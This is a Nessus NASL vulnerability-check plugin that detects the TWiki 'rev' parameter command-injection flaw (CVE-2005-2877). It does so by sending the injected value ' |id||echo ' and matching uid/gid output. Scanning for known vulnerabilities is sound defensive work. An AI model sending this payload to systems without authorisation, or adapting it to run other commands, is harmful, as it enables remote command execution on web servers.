#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(19704);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/06/05");

  script_cve_id("CVE-2005-2877");
  script_bugtraq_id(14834);

  script_name(english:"TWiki 'rev' Parameter Arbitrary Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a CGI application that is affected by
an arbitrary command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of TWiki running on the remote host allows an attacker to
manipulate input to the 'rev' parameter in order to execute arbitrary
shell commands on the remote host subject to the privileges of the web
server user id.");
  # http://twiki.org/cgi-bin/view/Codev/SecurityAlertExecuteCommandsWithRev
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c70904f3");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate hotfix referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"metasploit_name", value:'TWiki History TWikiUsers rev Parameter Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/09/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2004/09/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/09/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:twiki:twiki");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_set_attribute(attribute:"enable_cgi_scanning", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("twiki_detect.nasl");
  script_require_keys("installed_sw/TWiki");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "TWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

if ("cgi-bin" >!< dir)
{
  dir = ereg_replace(pattern:"(/[^/]+/).*", string:dir, replace:"\1");
  dir = dir + "bin/";
}
else
  dir = dir - "view";

url = "view/Main/TWikiUsers?rev=2" + urlencode(str:" |id||echo ");

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + url,
  exit_on_fail : TRUE
);

vuln = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res[2]);
if (!empty_or_null(vuln))
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    cmd         : 'id',
    line_limit  : 2,
    request     : make_list(build_url(qs:dir+url, port:port)),
    output      : chomp(vuln)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
